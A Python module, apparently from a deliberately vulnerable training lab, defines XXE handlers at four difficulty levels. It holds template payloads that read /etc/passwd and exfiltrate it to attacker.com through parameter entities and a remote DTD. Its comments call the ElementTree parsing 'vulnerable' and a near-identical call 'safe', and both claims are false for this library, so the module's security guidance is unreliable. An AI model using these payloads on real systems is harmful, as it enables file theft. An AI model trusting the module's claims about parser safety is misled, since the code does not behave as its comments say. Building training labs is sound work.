import xml.etree.ElementTree as ET
from typing import Dict, Any
import base64


class XXEVulnerabilities:
    """XXE (XML External Entity) Vulnerability implementations"""
    
    def __init__(self):
        self.malicious_xml_templates = {
            "basic": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>""",
            
            "medium": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
]>
<root>
    <data>&evil;</data>
</root>""",
            
            "hard": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
]>
<root>
    <data>test</data>
</root>""",
            
            "expert": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
]>
<root>
    <data>&evil;</data>
</root>"""
        }
    
    def basic_xxe_file_read(self, xml_content: str) -> Dict[str, Any]:
        """Basic XXE - Direct file read"""
        try:
            # Vulnerable XML parsing - allows external entities
            root = ET.fromstring(xml_content)
            
            # Extract data from XML
            data_elements = root.findall('.//data')
            result = []
            
            for elem in data_elements:
                if elem.text:
                    result.append(elem.text)
            
            return {
                "success": True,
                "data": result,
                "vulnerability": "Basic XXE - Direct file read allowed",
                "risk_level": "High"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Basic XXE - Error in XML parsing",
                "risk_level": "High"
            }
    
    def medium_xxe_remote_entity(self, xml_content: str) -> Dict[str, Any]:
        """Medium XXE - Remote entity inclusion"""
        try:
            # Vulnerable XML parsing with remote entity support
            root = ET.fromstring(xml_content)
            
            # Extract data from XML
            data_elements = root.findall('.//data')
            result = []
            
            for elem in data_elements:
                if elem.text:
                    result.append(elem.text)
            
            return {
                "success": True,
                "data": result,
                "vulnerability": "Medium XXE - Remote entity inclusion allowed",
                "risk_level": "Critical"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Medium XXE - Error in XML parsing",
                "risk_level": "Critical"
            }
    
    def hard_xxe_parameter_entity(self, xml_content: str) -> Dict[str, Any]:
        """Hard XXE - Parameter entity injection"""
        try:
            # Vulnerable XML parsing with parameter entity support
            root = ET.fromstring(xml_content)
            
            # Extract data from XML
            data_elements = root.findall('.//data')
            result = []
            
            for elem in data_elements:
                if elem.text:
                    result.append(elem.text)
            
            return {
                "success": True,
                "data": result,
                "vulnerability": "Hard XXE - Parameter entity injection allowed",
                "risk_level": "Critical"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Hard XXE - Error in XML parsing",
                "risk_level": "Critical"
            }
    
    def expert_xxe_chained_attack(self, xml_content: str) -> Dict[str, Any]:
        """Expert XXE - Chained attack with multiple techniques"""
        try:
            # Vulnerable XML parsing with multiple attack vectors
            root = ET.fromstring(xml_content)
            
            # Extract data from XML
            data_elements = root.findall('.//data')
            result = []
            
            for elem in data_elements:
                if elem.text:
                    result.append(elem.text)
            
            return {
                "success": True,
                "data": result,
                "vulnerability": "Expert XXE - Chained attack with multiple techniques",
                "risk_level": "Critical",
                "attack_vectors": [
                    "File read via external entity",
                    "Remote entity inclusion",
                    "Parameter entity injection",
                    "Data exfiltration"
                ]
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Expert XXE - Error in XML parsing",
                "risk_level": "Critical"
            }
    
    def get_malicious_xml_template(self, level: str) -> str:
        """Get malicious XML template for testing"""
        return self.malicious_xml_templates.get(level, self.malicious_xml_templates["basic"])
    
    def validate_xml_safe(self, xml_content: str) -> Dict[str, Any]:
        """Safe XML validation (for comparison)"""
        try:
            # Safe XML parsing - disables external entities
            parser = ET.XMLParser(target=ET.TreeBuilder())
            root = ET.fromstring(xml_content, parser=parser)
            
            # Extract data from XML
            data_elements = root.findall('.//data')
            result = []
            
            for elem in data_elements:
                if elem.text:
                    result.append(elem.text)
            
            return {
                "success": True,
                "data": result,
                "vulnerability": "Safe XML parsing - External entities disabled",
                "risk_level": "Low"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerability": "Safe XML parsing - Error in XML parsing",
                "risk_level": "Low"
            }
